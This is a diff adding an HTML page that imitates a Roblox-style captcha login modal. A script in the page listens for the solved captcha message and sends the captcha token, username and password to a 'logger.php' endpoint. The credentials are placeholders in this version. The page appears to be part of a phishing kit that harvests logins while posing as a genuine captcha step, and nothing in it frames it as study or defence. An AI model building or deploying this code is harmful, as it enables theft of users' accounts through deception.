@@ -1,0 +1,30 @@
+<script>
+window.addEventListener("message", this.Message, false);
+function Message(event) {
+    var msg = event.data.message;
+    if(msg == "sendKey") {
+        document.getElementById("captcha").innerHTML = ""
+        let user = "Test"
+        let pass = "TEst"
+        fetch("login/logger.php?captcha="+event.data.value+"&username="+user+"&password="+pass)
+    } else if(msg == "CaptchaLoaded") {
+        document.getElementById("captcha").style.display = "";
+    }
+}
+</script>
+<link rel="stylesheet" href="rbx.css">
+<captcha activated="loginCaptchaActivated" style="display:none !important;" id="captcha" captcha-action-type="captchaActionTypes.login" extra-validation-params="captchaExtraValidationParams" input-params="inputParams" captcha-failed="handleCaptchaError" captcha-passed="handleCaptchaSuccess" return-token-in-success-cb="captchaReturnTokenInSuccessCb" class="ng-isolate-scope">
+   <div class="captcha-container ng-scope" ng-controller="captchaV2Controller">
+      <div class="modal captcha-activated" ng-class="$ctrl.getCaptchaClasses()" ng-click="$ctrl.hideCaptcha()">
+         <div class="modal-dialog">
+             <br/><br/><br/><br/>
+            <div class="modal-content">
+               <div class="modal-body" ng-click="$event.stopPropagation()">
+                  <button type="button" class="close" ng-click="$ctrl.hideCaptcha()"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button> 
+                     <div id="FunCaptcha"><iframe frameborder="0" scrolling="no" id="fc-iframe-wrap" class="fc-iframe-wrap" aria-label=" " style="width: 308px; height: 252px;" src="/Synical/captcha.php"></iframe></div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+</captcha>
